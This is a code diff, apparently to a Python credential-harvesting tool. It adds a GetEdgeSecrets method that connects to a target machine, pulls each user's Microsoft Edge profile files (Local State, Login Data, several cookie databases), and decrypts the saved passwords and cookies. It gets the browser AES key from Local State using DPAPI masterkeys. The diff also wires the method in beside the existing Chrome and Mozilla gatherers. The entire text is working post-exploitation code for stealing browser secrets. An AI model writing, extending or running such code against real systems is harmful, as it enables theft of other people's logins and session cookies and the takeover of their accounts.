@@ -387,6 +387,139 @@ class MySeatBelt:
 				f"[{self.options.target_ip}] {bcolors.WARNING}Exception logsecret for {data} {bcolors.ENDC}")
 			self.logging.debug(ex)
 
+
+	def GetEdgeSecrets(self):
+		self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering MSEdge Secrets {bcolors.ENDC}")
+		blacklist = ['.', '..']
+
+		user_directories = [("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data", 'Local State',
+							 'ChromeLocalState', 'DOMAIN'),
+							("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default", 'Cookies',
+							 'ChromeCookies', 'DOMAIN'),
+							("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default",
+							 'Extension Cookies', 'ChromeCookies', 'DOMAIN'),
+							(
+							"Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network", 'Cookies',
+							'ChromeCookies', 'DOMAIN'),
+							(
+							"Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Safe Browsing Network",
+							'Safe Browsing Cookies', 'ChromeCookies', 'DOMAIN'),
+							("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default", 'Login Data',
+							 'ChromeLoginData', 'DOMAIN'),
+							("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data", 'Last Version',
+							 'ChromeVersion', 'DOMAIN'),
+							]
+
+		for user in self.users:
+			if user.username == 'MACHINE$':
+				continue
+			else:
+				directories_to_use = user_directories
+				myoptions = copy.deepcopy(self.options)
+				myoptions.file = None  # "chrome_enc_blob.tmp"  # BLOB to parse
+				myoptions.key = None
+				myoptions.masterkeys = None
+				myChromeSecrets = CHROME_LOGINS(myoptions, self.logging, self.db, user.username, type="MSEdge")
+
+			# if len(user.masterkeys)>0:#Pas de masterkeys==pas de datas a recup
+			for info in directories_to_use:
+				my_dir, my_mask, my_blob_type, my_user_type = info
+				tmp_pwd = my_dir.format(
+					username=user.username)  # tmp_pwd = f"Users\\{user.username}\\{my_dir}"#ntpath.join(ntpath.join('Users', user.username), my_dir)
+				self.logging.debug(
+					f"[{self.options.target_ip}] Looking for {user.username} files in {tmp_pwd} with mask {my_mask}")
+				my_directory = self.myfileops.do_ls(tmp_pwd, my_mask, display=False)
+				for infos in my_directory:
+					longname, is_directory = infos
+					self.logging.debug("ls returned file %s" % longname)
+					if longname not in blacklist and not is_directory:
+						try:
+							self.logging.debug(
+								f"[{self.options.target_ip}] [+] Found {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Chrome files : {longname}")
+							# Downloading Blob file
+							localfile = self.myfileops.get_file(ntpath.join(tmp_pwd, longname), allow_access_error=True)
+							# myoptions = copy.deepcopy(self.options)
+							if my_blob_type == 'ChromeLocalState':
+								try:
+									myChromeSecrets.localstate_path = localfile
+									guid = myChromeSecrets.get_masterkey_guid_from_localstate()
+									if guid != None:
+										masterkey = self.get_masterkey(user=user, guid=guid, type=my_user_type)
+										if masterkey != None:
+											if masterkey['status'] == 'decrypted':
+												myChromeSecrets.masterkey = masterkey['key']
+												aesKey = myChromeSecrets.get_AES_key_from_localstate(
+													masterkey=masterkey['key'])
+												if aesKey != None:
+													self.logging.debug(
+														f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull of {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Chrome AES Key {aesKey} {bcolors.ENDC}")
+												else:
+													self.logging.debug(
+														f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting AES Key for Chrome Local State with Masterkey{bcolors.ENDC}")
+											else:
+												self.logging.debug(
+													f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting AES Key for Chrome Local State  - Masterkey not decrypted{bcolors.ENDC}")
+										else:
+											self.logging.debug(
+												f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting AES Key for Chrome Local State with Masterkey- cant get masterkey {guid}{bcolors.ENDC}")
+									else:
+										self.logging.debug(
+											f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting AES Key for Chrome Local State with Masterkey - can t get the GUID of masterkey from blob file{bcolors.ENDC}")
+								except Exception as ex:
+									self.logging.debug(
+										f"[{self.options.target_ip}] {bcolors.WARNING}Exception in ChromeLocalState{bcolors.ENDC}")
+									self.logging.debug(ex)
+							if my_blob_type == 'ChromeLoginData':
+								try:
+									myChromeSecrets.logindata_path = localfile
+									user.files[longname] = {}
+									user.files[longname]['type'] = my_blob_type
+									user.files[longname]['status'] = 'encrypted'
+									user.files[longname]['path'] = localfile
+									logins = myChromeSecrets.decrypt_chrome_LoginData()
+									user.files[longname]['secret'] = logins
+									if logins is not None:
+										user.files[longname]['status'] = 'decrypted'
+								except Exception as ex:
+									self.logging.debug(
+										f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting logindata for CHROME {user.username} {localfile} {bcolors.ENDC}")
+									self.logging.debug(ex)
+							if my_blob_type == 'ChromeCookies':
+								try:
+									myChromeSecrets.cookie_path = localfile
+									user.files[longname] = {}
+									user.files[longname]['type'] = my_blob_type
+									user.files[longname]['status'] = 'encrypted'
+									user.files[longname]['path'] = localfile
+									cookies = myChromeSecrets.decrypt_chrome_CookieData()
+									user.files[longname]['secret'] = cookies
+									if cookies is not None:
+										user.files[longname]['status'] = 'decrypted'
+								except Exception as ex:
+									self.logging.debug(
+										f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting CookieData for CHROME {user.username} {localfile} {bcolors.ENDC}")
+									self.logging.debug(ex)
+							if my_blob_type == 'ChromeVersion':
+								try:
+									myChromeSecrets.version_path = localfile
+									user.files[longname] = {}
+									user.files[longname]['type'] = my_blob_type
+									user.files[longname]['status'] = 'encrypted'
+									user.files[longname]['path'] = localfile
+									cookies = myChromeSecrets.get_chrome_Version()
+									user.files[longname]['secret'] = cookies
+									if cookies is not None:
+										user.files[longname]['status'] = 'decrypted'
+								except Exception as ex:
+									self.logging.debug(
+										f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting CookieData for CHROME {user.username} {localfile} {bcolors.ENDC}")
+									self.logging.debug(ex)
+
+						except Exception as ex:
+							self.logging.debug(
+								f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting Blob for {localfile} with Masterkey{bcolors.ENDC}")
+							self.logging.debug(ex)
+
 	def GetMozillaSecrets_wrapper(self):
 		self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering Mozilla Secrets {bcolors.ENDC}")
 
@@ -2136,6 +2269,7 @@ class MySeatBelt:
 					self.GetCertificates()
 				if self.options.no_browser == False:
 					self.GetChromeSecrets()
+					self.GetEdgeSecrets()
 					self.GetMozillaSecrets_wrapper()
 				if self.options.no_sysadmins == False:
 					self.GetMRemoteNG()
